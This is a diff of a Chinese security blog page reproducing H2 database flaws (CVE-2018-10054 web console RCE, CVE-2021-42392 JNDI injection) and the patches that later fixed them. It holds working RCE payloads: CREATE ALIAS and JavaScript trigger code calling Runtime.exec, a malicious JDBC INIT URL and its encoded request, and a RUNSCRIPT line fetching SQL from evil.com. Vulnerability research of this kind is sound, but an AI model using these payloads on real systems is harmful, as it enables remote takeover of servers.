@@ -324,7 +324,7 @@
             
               <div class="markdown-body">
                 
-                <p>由于工作中遇到了h2 数据库，故想着系统点梳理下h2 数据库 的一些漏洞，并初步探讨各种场景与限制下的漏洞利用。</p>
+                <p>由于工作中遇到了h2 数据库，故想着系统点梳理复现下h2 数据库 的一些漏洞，并初步探讨各种场景与限制下的漏洞利用。</p>
 <h1 id="Web-Console-RCE（CVE-2018-10054）"><a href="#Web-Console-RCE（CVE-2018-10054）" class="headerlink" title="Web Console RCE（CVE-2018-10054）"></a>Web Console RCE（CVE-2018-10054）</h1><p>当Spring Boot集成H2 Database时，如果设置如下选项，将会启用一个Web管理页面：</p>
 <figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">spring.h2.console.enabled&#x3D;true
 spring.h2.console.settings.web-allow-others&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>
@@ -340,16 +340,13 @@ spring.h2.console.settings.web-allow-others&#x3D;true<span aria-hidden="true" cl
 <li><code>CREATE ALIAS func AS code...; CALL func ...</code> （需要有<code>javac</code> ）</li>
 <li><code>CREATE TRIGGER ... AS code...</code></li>
 <li><code>RUNSCRIPT FROM &#39;http://evil.com/script.sql&#39;</code></li>
-<li><code>JDBC Attack</code></li>
+<li><code>JDBC Attack</code> （前台）</li>
 </ul>
-<p>当目标环境中存在 <code>javac</code>（JDK 环境），可通过 CREATE ALIAS 定义 Java 方法RCE：</p>
+<h2 id="JDK环境"><a href="#JDK环境" class="headerlink" title="JDK环境"></a>JDK环境</h2><p>当目标环境中存在 <code>javac</code>（JDK 环境），可通过 CREATE ALIAS 定义 Java 方法RCE：</p>
 <figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">CREATE</span> <span class="token constant">ALIAS</span> <span class="token constant">EXEC</span> <span class="token constant">AS</span> '<span class="token class-name">String</span> <span class="token function">rce</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span> <span class="token punctuation">&#123;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>'<span class="token punctuation">;</span>
 <span class="token class-name">CALL</span> <span class="token constant">EXEC</span> <span class="token punctuation">(</span>'<span class="token keyword">open</span> <span class="token operator">-</span>a <span class="token class-name">Calculator</span><span class="token punctuation">.</span>app'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>
 
-<p>当目标Java版本较低，可通过 JavaScript 方法RCE：</p>
-<blockquote>
-<p> 由于 Java 15 以后 Java 自带的 Nashorn JavaScript 引擎被删除</p>
-</blockquote>
+<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>当目标Java版本较低（Java 15 以后 Java 自带的 Nashorn JavaScript 引擎被删除），可通过 JavaScript 方法RCE：</p>
 <figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> shell3 BEFORE <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">AS</span> $$<span class="token comment">//javascript</span>
     var <span class="token operator">is</span> <span class="token operator">=</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span>
     var scanner <span class="token operator">=</span> new java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">(</span><span class="token operator">is</span><span class="token punctuation">)</span><span class="token punctuation">.</span>useDelimiter<span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span>
@@ -357,8 +354,8 @@ spring.h2.console.settings.web-allow-others&#x3D;true<span aria-hidden="true" cl
 $$<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
 
 <p>效果如图，<code>id</code>命令被成功执行，结果以异常的形式被抛出：<br><img src="/2025/07/06/WEB/h2database/id.png" srcset="/img/loading.gif" lazyload></p>
-<p>第三种远程调用即把sql文件的内容写成上方语句即可：<br><img src="/2025/07/06/WEB/h2database/RUNSCRIPT.png" srcset="/img/loading.gif" lazyload alt="RUNSCRIPT"></p>
-<p>在第四种方法打JDBC，需要注意 <code>CVE-2018-10054</code> 的前提条件是能进入到后台执行 sql 处的页面，而 p牛 在文章中指出，通过 jdbc attack 的方式可以实现前台攻击：</p>
+<h2 id="远程执行sql"><a href="#远程执行sql" class="headerlink" title="远程执行sql"></a>远程执行sql</h2><p>第三种远程调用即把sql文件的内容写成上方语句即可：<br><img src="/2025/07/06/WEB/h2database/RUNSCRIPT.png" srcset="/img/loading.gif" lazyload alt="RUNSCRIPT"></p>
+<h2 id="JDBC-Attack"><a href="#JDBC-Attack" class="headerlink" title="JDBC Attack"></a>JDBC Attack</h2><p>在第四种方法打JDBC，需要注意 <code>CVE-2018-10054</code> 的前提条件是能进入到后台执行 sql 处的页面，而 p牛 在文章中指出，通过 jdbc attack 的方式可以实现前台攻击：</p>
 <figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$&#x2F;&#x2F;javascript
     java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator.app&quot;)
 $$;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
@@ -379,7 +376,7 @@ Priority: u&#x3D;0, i
 language&#x3D;en&amp;setting&#x3D;Generic+H2+%28Embedded%29&amp;name&#x3D;Generic+H2+%28Embedded%29&amp;driver&#x3D;org.h2.Driver&amp;url&#x3D;jdbc%3ah2%3amem%3atest%3bMODE%3dMSSQLServer%3bINIT%3dCREATE+TRIGGER+shell3+BEFORE+SELECT+ON+INFORMATION_SCHEMA.TABLES+AS+%24%24%2f%2fjavascript%0a++++java.lang.Runtime.getRuntime().exec(%22open+-a+Calculator.app%22)%0a%24%24%3b&amp;user&#x3D;sa&amp;password&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
 
 <p><img src="/2025/07/06/WEB/h2database/test.do.png" srcset="/img/loading.gif" lazyload alt="JDBC攻击"></p>
-<p>在后续修复的 <code>1.4.198</code> 版本中，默认h2 数据库不允许创建新的数据库（ jdbc 连接url拼接 <code>;FORBID_CREATION=TRUE</code> ）</p>
+<p>在后续修复的 <code>1.4.198</code> 版本中，存在这样的一个补丁：默认h2 数据库不允许创建新的数据库（ jdbc 连接url拼接 <code>;FORBID_CREATION=TRUE</code> ）</p>
 <p>我们可以看下改动代码部分来观察如何打补丁的 ：<br><code>org.h2.server.web.WebServer#getConnection</code><br><img src="/2025/07/06/WEB/h2database/h2WebServer-1.4.197.png" srcset="/img/loading.gif" lazyload alt="未改动之前"></p>
 <p>如上图，在没有打补丁之前，这里只是会判断数据库是否存在，如果不存在，则不会添加<code>IFEXISTS=TRUE</code>，那么在方法内部会隐式创建其内存数据库，进而达到JDBC注入的效果。 我们再来看看补丁改动之后的代码：</p>
 <p><code>https://github.com/h2database/h2database/compare/version-1.4.197...version-1.4.199</code></p>
@@ -412,7 +409,7 @@ $$;AUTHZPWD&#x3D;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span>
 <p><img src="/2025/07/06/WEB/h2database/202-before.png" srcset="/img/loading.gif" lazyload alt="before 2.0.202"></p>
 <p>在版本 <code>1.4.198</code> 到 <code>2.0.210</code> 之间，可支持不识别的属性（<del>更无脑了</del>）</p>
 <p>在版本<code>2.1.210</code>中<code>JDBC Attack</code>被修复，也就是说在版本<code>2.1.210</code>及其之后，Web console登陆页面的RCE问题已被修复。</p>
-<h1 id="Web-Console-JNDI-Injection（CVE-2021-42392）"><a href="#Web-Console-JNDI-Injection（CVE-2021-42392）" class="headerlink" title="Web Console JNDI Injection（CVE-2021-42392）"></a>Web Console JNDI Injection（CVE-2021-42392）</h1><p>先来关注一下<code>1.4.198</code>之后版本的这部分代码：<br><code>org.h2.util.JdbcUtils#getConnection</code></p>
+<h1 id="Web-Console-JNDI-Injection（CVE-2021-42392）"><a href="#Web-Console-JNDI-Injection（CVE-2021-42392）" class="headerlink" title="Web Console JNDI Injection（CVE-2021-42392）"></a>Web Console JNDI Injection（CVE-2021-42392）</h1><p>再来关注一下<code>1.4.198</code>之后版本的这部分代码：<br><code>org.h2.util.JdbcUtils#getConnection</code></p>
 <p><img src="/2025/07/06/WEB/h2database/199-getConnection.png" srcset="/img/loading.gif" lazyload alt="getConnection"></p>
 <p>可以看出，这段代码会判断加载进来的 Driver Class  是否实现了 <code>java.sql.Driver</code>接口（父类） 或者<code>javax.naming.Context</code>接口（父类） ，也就是判断加载的类是否是一个 JDBC 驱动程序或 JNDI 上下文，从而选择合适的连接方法。</p>
 <p>Web Console 页面上默认的连接是 <code>org.h2.Driver</code> , 其是实现的java.sql.Driver接口。</p>
